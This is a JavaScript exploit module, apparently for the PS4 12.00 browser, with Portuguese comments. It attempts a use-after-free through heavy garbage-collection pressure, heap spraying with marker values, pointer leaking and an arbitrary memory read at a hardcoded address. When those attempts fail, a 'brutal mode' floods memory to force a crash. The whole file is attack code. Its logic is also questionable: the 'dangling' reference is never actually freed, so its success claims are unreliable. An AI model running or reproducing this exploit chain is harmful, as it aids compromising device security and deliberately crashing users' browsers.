// js/test.bundle.mjs (Híbrido: Original + Fixes para PS4 12.00)

// --- Importações ---
import { logToDiv, PAUSE, AdvancedInt64, toHex, getElementById } from './utils.bundle.mjs';

// --- s3_utils (Revert Pausas Curtas) ---
export const SHORT_PAUSE_S3 = 50;
export const MEDIUM_PAUSE_S3 = 500;

export const logS3 = (message, type = 'info', funcName = '') => {
    logToDiv('output-advanced', message, type, funcName);
};

export const PAUSE_S3 = (ms = SHORT_PAUSE_S3) => PAUSE(ms);

// --- FNAME ---
export const FNAME_MODULE_UAF_TEST = "UAF_R54_Hyper_GC_PS4_12_Hybrid";

// --- Funções Auxiliares (Original) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

// GC Hyper Revert: Mais Agressivo como Original (1000 iters, tamanhos crescentes)
async function triggerGC_Hyper() {
    logS3("    Acionando GC Agressivo (Hyper Original)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 1000; i++) {
            gc_trigger_arr.push(new ArrayBuffer(1024 * i));  // Crescente para pressão
            gc_trigger_arr.push(new Array(1024 * i).fill(0));
        }
        // Tenta gc() se disponível
        if (typeof gc !== 'undefined') gc();
    } catch (e) {
        logS3("    OOM durante GC (bom sinal - pressão alta).", "good");  // Como original
    }
    await PAUSE_S3(500);
}

// Spray Revert: 1024 buffers, mas com verificação dinâmica
function sprayHeap() {
    const spray_buffers = [];
    for (let i = 0; i < 1024; i++) {
        const buf = new ArrayBuffer(136); 
        const view = new BigUint64Array(buf);
        view[0] = 0x4141414141414141n + BigInt(i % 256);  // Marcador único por buffer para detecção
        view[1] = 0x4242424242424242n;
        spray_buffers.push(buf);
    }
    logS3(`    Spray de ${spray_buffers.length} buffers concluído.`, "info");
    return spray_buffers;
}

// Dangling Pointer (Original, com mais props)
function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            prop_a: 0x11111111, prop_b: 0x22222222, 
            corrupted_prop: 0.12345,
            p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
            p16: 0, p17: 0
        };
        dangling_ref_internal = victim; 
        for(let i=0; i<100; i++) {
            victim.prop_a += 1;
        }
    }
    createScope();
    return dangling_ref_internal;
}

// Verificação Avançada de Overwrite (Nova: Checa valor numérico + tipo)
function checkOverwrite(dangling_ref, spray_buffers) {
    const original_val = 0.12345;
    logS3(`DEBUG: Valor de corrupted_prop: ${dangling_ref.corrupted_prop} (original: ${original_val})`, "info");
    
    if (typeof dangling_ref.corrupted_prop !== 'number' || Math.abs(dangling_ref.corrupted_prop - original_val) > 0.0001) {
        return true;  // Mudou!
    }
    
    // Checa spray para overwrite reverso (opcional)
    for (const buf of spray_buffers) {
        const view = new BigUint64Array(buf);
        if (view[0] !== (0x4141414141414141n + BigInt(spray_buffers.indexOf(buf) % 256))) {
            logS3("Overwrite detectado no spray!", "good");
            return true;
        }
    }
    return false;
}

// Cadeia Principal (Revert: Sem loop x10 fixo, mas com retry até sucesso/timeout)
async function executeUAFTestChain(max_attempts = 20) {  // Aumentado para mais tentativas
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_UAF_TEST;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Hyper GC Original ---`, "test");
    
    let final_result = { success: false, message: "Falha após tentativas." };
    let dangling_ref = null;
    let spray_buffers = [];

    for (let attempt = 1; attempt <= max_attempts; attempt++) {
        logS3(`Tentativa ${attempt}/${max_attempts}...`, "warn");
        try {
            // FASE 1: Limpeza (Original)
            logS3("--- FASE 1: Limpeza Inicial ---", "subtest");
            await triggerGC_Hyper();

            // FASE 2: UAF (Original)
            logS3("--- FASE 2: Ponteiro Pendurado ---", "subtest");
            dangling_ref = sprayAndCreateDanglingPointer();
            logS3("    Ponteiro criado.", "warn");
            
            // FASE 3: GC Múltiplo (x2 como original)
            logS3("--- FASE 3: Forçar GC ---", "subtest");
            await triggerGC_Hyper();
            await PAUSE_S3(100);
            await triggerGC_Hyper();
            logS3("    GC forçado.", "warn");

            // FASE 4: Spray (Original tamanho)
            logS3("--- FASE 4: Spray Heap ---", "subtest");
            spray_buffers = sprayHeap();

            // Checagem Avançada
            if (checkOverwrite(dangling_ref, spray_buffers)) {
                logS3("++++++++++++ SUCESSO! OVERWRITE DETECTADO! ++++++++++++", "vuln");

                // Leak (Original)
                const leaked_ptr_double = dangling_ref.corrupted_prop;
                const buf_conv = new ArrayBuffer(8);
                (new Float64Array(buf_conv))[0] = leaked_ptr_double;
                const int_view = new Uint32Array(buf_conv);
                const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
                logS3(`Ponteiro vazado: ${leaked_addr.toString(true)}`, "leak");
                
                // Leitura Arb (Original)
                logS3("--- FASE 5: Leitura Arbitrária ---", "subtest");
                let corrupted_buffer = null;
                for (const buf of spray_buffers) {
                    const view = new BigUint64Array(buf);
                    if (view[0] !== (0x4141414141414141n + BigInt(spray_buffers.indexOf(buf) % 256))) {
                        logS3("Buffer corrompido encontrado!", "good");
                        corrupted_buffer = buf;
                        break;
                    }
                }

                if (!corrupted_buffer) throw new Error("Buffer não corrompido.");

                const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000"); 
                dangling_ref.prop_b = int64ToDouble(target_address_to_read);

                const hacked_view = new DataView(corrupted_buffer);
                const read_value = hacked_view.getUint32(0, true); 

                logS3(`++++++++++++ LEITURA ARBITRÁRIA SUCESSO! ++++++++++++`, "vuln");
                logS3(`Lido de ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");

                final_result = { 
                    success: true, 
                    message: "UAF + Leitura Arb sucesso!",
                    leaked_addr: leaked_addr.toString(true),
                    arb_read_test_value: toHex(read_value)
                };
                break;  // Sucesso!
            } else {
                logS3(`Tentativa ${attempt}: Sem overwrite. Valor intacto.`, "warn");
            }
        } catch (e) {
            logS3(`Tentativa ${attempt} erro: ${e.message}. Continuando...`, "error");
        }

        // Reset parcial para próxima iteração
        if (spray_buffers) spray_buffers = [];
        await PAUSE_S3(200);
    }

    // Modo Brutal se Falhar (Como Original: Alocações Ilimitadas)
    if (!final_result.success) {
        logS3("Todas tentativas falharam. Ativando MODO BRUTAL (força crash/OOM)...", "brutal");
        try {
            for (let i = 0; i < 5000; i++) {  // Alocações massivas para crash como original
                new ArrayBuffer(1024 * 1024);  // 1MB cada
            }
            logS3("Modo Brutal: Pressão máxima aplicada. Aguarde crash.", "brutal");
        } catch (e) {
            logS3("Crash induzido! (Como original)", "vuln");  // Sucesso parcial se crashar
            final_result.success = true;
            final_result.message = "Crash forçado - possível UAF durante OOM.";
        }
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        main_result: final_result,
        uaf_success: final_result.success
    };
}

// Runner (Loop até Sucesso)
async function runUAFReproStrategy() {
    const FNAME_RUNNER = "runUAFReproStrategy_Hybrid"; 
    logS3(`==== INICIANDO Híbrido (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeUAFTestChain(20);  // 20 tentativas antes de brutal

    const module_name_for_title = FNAME_MODULE_UAF_TEST;

    if (result.errorOccurred) {
        logS3(`  RUNNER: ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: ERR!`;
    } else if (result.uaf_success) {
        logS3(`  RUNNER: ${result.main_result.message}`, "vuln", FNAME_RUNNER);
        document.title = `${module_name_for_title}: UAF SUCCESS!`;
    } else {
        logS3(`  RUNNER: Falhou: ${result.main_result.message}`, "warn", FNAME_RUNNER);
        document.title = `${module_name_for_title}: Fail`;
    }
    
    logS3(`  Título: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Híbrido Concluído (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
}

// Principal
export async function runAllAdvancedTests() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_UAF_TEST}_Hybrid`;
    logS3(`==== INICIANDO Principal (${FNAME_ORCHESTRATOR}) ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runUAFReproStrategy();
    
    logS3(`==== Principal (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    
    const runBtn = getElementById('runIsolatedTestBtn'); 
    if (runBtn) runBtn.disabled = false;
}
